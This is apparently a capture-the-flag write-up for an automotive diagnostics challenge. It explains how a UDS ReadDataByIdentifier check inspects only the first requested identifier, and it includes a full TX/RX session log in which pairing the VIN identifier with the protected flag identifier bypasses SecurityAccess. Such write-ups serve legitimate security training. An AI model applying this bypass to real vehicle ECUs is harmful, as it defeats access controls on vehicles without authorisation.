## Level 4 - ReadDataByIdentifier Security Bypass
This level protects the flag DataIdentifier through DiagnosticSession/SecurityAccess flow from before; however, the
SecurityAccess function does not contain a password and will always return InvalidKey. The bug in this level is that
the ReadDataByIdentifier spec allows multiple DataIdentifiers to be requested at once, returning all requested values.
The check for DiagnosticSession only checks the first submitted DataIdentifier for the flag DataIdentifier before 
entering the process loop, allowing the attacker to submit an open value (VIN) followed by the flag.

Example session
```shell
# read data by identifier 0x1337 (Flag)
TX: 22 1337
# read data by identifier - Negative Response - Conditions Not Correct
RX: 7f 2222

# read data by identifier 0xf190 (VIN)
TX: 22 f190
# read data by identifier - Positive Response
RX: 62 f190415452454449533133337

#DiagnosticSession - Start 0x02 - Negative Response - Security Access Denied
TX: 10 02
RX: 7f 1033

#SecurityAccess - RequestSeed - Positive Response
TX: 27 01
RX: 67 01ffffffff

#SecurityAccess - Submit Key - Negative Response - Invalid Key
TX: 27 0201020304
RX: 7f 2735

#SecurityAccess - Submit Key - Negative Response - Invalid Key
TX: 27 0201020305
RX: 7f 2735

#SecurityAccess - Submit Key - Negative Response - Invalid Key
TX: 27 0201020306
RX: 7f 2735

#ReadDataByIdentifier - VIN (0xf190) + Flag (0x1337) - PositiveResponse - Both values returned
TX: 22 f1901337
RX: 62 f19041545245444953313333371337692d73776561722d692d636865636b65642d7468617421
```